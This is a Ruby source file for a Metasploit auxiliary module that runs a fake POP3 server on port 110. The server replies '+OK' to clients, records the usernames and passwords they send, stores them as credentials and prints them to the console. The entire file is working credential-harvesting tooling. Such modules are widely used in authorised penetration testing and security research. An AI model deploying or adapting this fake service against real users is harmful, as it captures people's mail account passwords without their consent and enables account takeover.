##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report


  def initialize
    super(
      'Name'        => 'Authentication Capture: POP3',
      'Description'    => %q{
        This module provides a fake POP3 service that
      is designed to capture authentication credentials.
      },
      'Author'      => ['ddz', 'hdm'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Capture' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Capture'
    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 110 ])
      ])
  end

  def setup
    super
    @state = {}
  end

  def run
    @myhost = datastore['SRVHOST']
    @myport = datastore['SRVPORT']
    exploit()
  end

  def on_client_connect(c)
    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
    c.put "+OK\r\n"
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_data(c)
    data = c.get_once
    return if not data
    cmd,arg = data.strip.split(/\s+/, 2)
    arg ||= ""

    if(cmd.upcase == "USER")
      @state[c][:user] = arg
      c.put "+OK\r\n"
      return
    end

    if(cmd.upcase == "PASS")
      @state[c][:pass] = arg

      report_cred(
        ip: @state[c][:ip],
        port: @myport,
        service_name: 'pop3',
        user: @state[c][:user],
        password: @state[c][:pass],
        proof: arg
      )
      print_good("POP3 LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
      @state[c][:pass] = data.strip
      c.put "+OK\r\n"
      return
    end

    if(cmd.upcase == "STAT")
      c.put "+OK 0 0\r\n"
      return
    end

    if(cmd.upcase == "CAPA")
      c.put "-ERR No Extended Capabilities\r\n"
      return
    end

    if(cmd.upcase == "LIST")
      c.put "+OK 0 Messages\r\n"
      return
    end

    if(cmd.upcase == "QUIT" || cmd.upcase == "RSET" || cmd.upcase == "DELE")
      c.put "+OK\r\n"
      return
    end

    print_status("POP3 UNKNOWN CMD #{@state[c][:name]} \"#{data.strip}\"")
    c.put "+OK\r\n"
  end

  def on_client_close(c)
    @state.delete(c)
  end


end
